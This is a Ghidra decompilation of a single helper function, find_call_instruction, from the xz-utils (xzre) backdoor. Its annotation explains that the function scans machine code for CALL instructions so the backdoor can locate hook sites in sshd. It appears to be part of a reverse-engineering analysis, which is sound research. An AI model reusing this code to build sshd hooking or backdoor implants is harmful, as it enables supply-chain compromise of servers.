// /home/kali/xzre-ghidra/xzregh/100C90_find_call_instruction.c
// Function: find_call_instruction @ 0x100C90
// Calling convention: unknown
// Prototype: undefined find_call_instruction(void)


/*
 * AutoDoc: Disassembles forward until it encounters a CALL opcode and reports both the instruction and target. The hook finder uses it to locate indirect dispatcher sites in sshd so the injected shims can be spliced in safely.
 */
#include "xzre_types.h"


undefined8 find_call_instruction(ulong param_1,ulong param_2,long param_3,long *param_4)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  byte bVar4;
  long ctx [12];
  
  bVar4 = 0;
  iVar1 = secret_data_append_from_address(0,0x81,4,7);
  if (iVar1 != 0) {
    plVar3 = ctx;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)plVar3 = 0;
      plVar3 = (long *)((long)plVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (param_4 == (long *)0x0) {
      param_4 = ctx;
    }
    while (param_1 < param_2) {
      iVar1 = x86_dasm(param_4,param_1,param_2);
      if (iVar1 == 0) {
        param_1 = param_1 + 1;
      }
      else {
        if (((int)param_4[5] == 0x168) &&
           ((param_3 == 0 || (param_4[1] + param_4[7] + *param_4 == param_3)))) {
          return 1;
        }
        param_1 = param_1 + param_4[1];
      }
    }
  }
  return 0;
}

